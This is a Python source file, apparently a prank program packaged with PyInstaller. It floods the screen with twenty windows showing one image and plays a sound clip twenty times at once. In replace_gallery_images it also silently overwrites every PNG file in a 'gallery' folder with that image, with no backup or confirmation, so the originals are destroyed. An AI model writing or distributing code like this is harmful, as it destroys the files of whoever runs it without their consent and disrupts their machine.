import os
import sys
import shutil
import threading
import random
import time
import tkinter as tk

from PIL import Image, ImageTk
import pygame


def resource_path(relative_path):
    """
    Allows the program to find files both when running normally
    and when bundled with PyInstaller.
    """
    try:
        base_path = sys._MEIPASS
    except AttributeError:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)


# Assets
IMAGE_PATH = resource_path("assets/image.png")
SOUND_PATH = resource_path("assets/sound.mp3")
GALLERY_FOLDER = resource_path("gallery")


def play_audio(count=20, delay=0.15):
    pygame.mixer.init()

    sound = pygame.mixer.Sound(SOUND_PATH)
    pygame.mixer.set_num_channels(count)

    channels = []

    for _ in range(count):
        channel = sound.play()
        if channel:
            channels.append(channel)
        time.sleep(delay)

    while any(channel.get_busy() for channel in channels):
        pygame.time.wait(100)


def show_image(count=30):
    root = tk.Tk()
    root.withdraw()  # Hide the root window

    img = Image.open(IMAGE_PATH)
    photo = ImageTk.PhotoImage(img)

    windows = []

    # Get screen size
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()

    # Image size
    img_width = photo.width()
    img_height = photo.height()

    for i in range(count):
        win = tk.Toplevel(root)
        win.title(f"Image {i + 1}")

        # Random position while keeping the whole image on screen
        x = random.randint(0, max(0, screen_width - img_width))
        y = random.randint(0, max(0, screen_height - img_height))

        win.geometry(f"{img_width}x{img_height}+{x}+{y}")

        label = tk.Label(win, image=photo)
        label.image = photo  # Prevent garbage collection
        label.pack()

        windows.append(win)

    root.mainloop()


def replace_gallery_images():
    if not os.path.exists(GALLERY_FOLDER):
        print("Gallery folder not found.")
        return

    for filename in os.listdir(GALLERY_FOLDER):
        if filename.lower().endswith(".png"):
            target = os.path.join(GALLERY_FOLDER, filename)
            shutil.copy2(IMAGE_PATH, target)
            print(f"Replaced: {filename}")


def main():
    # Start music
    audio_thread = threading.Thread(target=play_audio, args=(20,))
    audio_thread.start()

    # Replace images in the gallery folder
    replace_gallery_images()

    # Show the image
    show_image(20)

    # Wait until audio finishes
    audio_thread.join()


if __name__ == "__main__":
    main()